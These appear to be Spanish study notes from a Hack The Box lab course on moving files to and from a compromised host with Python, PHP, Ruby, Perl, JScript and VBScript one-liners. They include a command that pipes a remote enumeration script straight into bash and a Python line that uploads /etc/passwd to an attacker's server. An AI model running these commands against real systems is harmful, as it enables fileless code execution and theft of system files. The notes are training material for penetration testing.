Programas como Python, PHP, Perl y Ruby son programas comunes instalados tanto en Linux como en Windows.
Podemos aprovecharnos de estos programas para transmitir código entre máquinas. 

# 1. Python

A partir de Python2 podemos interactuar con servidores web.
## A. Descargas de archivos con Python2
Utilizando el comando:
```shell-session
Polika4RM@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

El archivo se guarda en el directorio de ejecución de dicho script.

## B. Descargas de archivos con Python3

```shell-session
Polika4RM@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

# 2. PHP
PHP se utiliza en el 77% de los sitios con backend, pues, es muy común encontrárnoslo.

## A. Método de descarga file_get_contents()
Descarga el contenido de una URL y lo guarda en un archivo:
```
php -r '$f = file_get_contents("URL"); file_put_contents("LinEnum.sh",$f);'`
```
## B. Método de descarga fopen()

```shell-session
Polika4RM@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
Se asemeja a un wget en PHP.


## C. Descarga PHP con pipe a BASH
Este método descarga el script remoto y lo ejecuta directamente con Bash sin guardarlo en un archivo local.  
Es un fileless execution (ejecución sin archivos), útil cuando no puedes o no quieres escribir en el disco:
```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

# 3. RUBY y PERL
Tanto Ruby como Perl permiten transferir archivos con one-liners, igual que hicimos con Python y PHP Ambos descargan el archivo remoto y lo guardan en disco.
## A. Ruby
```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("URL")))'
```
- Usa la librería net/http
- Descarga el archivo desde la URL.
- Lo guarda localmente como LinEnum.sh.
## B. Perl
```
perl -e 'use LWP::Simple; getstore("URL", "LinEnum.sh");'
```
- Descarga el archivo desde la URL. 
- Lo guarda como `LinEnum.sh`.

# 4. JavaScript
Guardamos el código wget.js con el siguiente contenido:
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); WinHttpReq.Open("GET", WScript.Arguments(0), false); WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1; BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile(WScript.Arguments(1));`
```

Lo ejecutamos desde CMD o Powershell con:
```
cscript.exe /nologo wget.js <URL> <archivo_destino>`
```
- WinHttpRequest → hace la petición HTTP al archivo.
- ADODB.Stream → crea un flujo binario para guardar el archivo.
- SaveToFile → guarda el contenido descargado en el disco.
- Permite descargar archivos en Windows sin wget o curl.

# 5. VBScript
De la misma forma que con JavaScript, guardamos en wget.vbs el siguiente contenido:
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
Lo ejecutamos desde CMD o Powershell con:
```
cscript.exe /nologo wget.vbs <URL> <archivo_destino>
```

- Microsoft.XMLHTTP → realiza la petición HTTP al archivo.
- Adodb.Stream → crea un flujo binario para guardar los datos.
- .savetofile → guarda el archivo en disco.
- Permite descargar archivos en Windows sin wget o curl.

# 6. Subida de archivos con Pyhton3
En primer lugar, iniciamos un servidor de python3 con:
```shell-session
Polika4RM@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- Permite subir archivos vía HTTP en la ruta /upload.
- Escucha en http\://0.0.0.0:8000/.

Con el siguiente oneliner, subo el archivo al servidor:
```
python3 -c 'import requests; requests.post("http://192.168.49.128:8000/upload", files={"files": open("/etc/passwd","rb")})'
```

Solo se pueden compartir archivos, no carpetas.

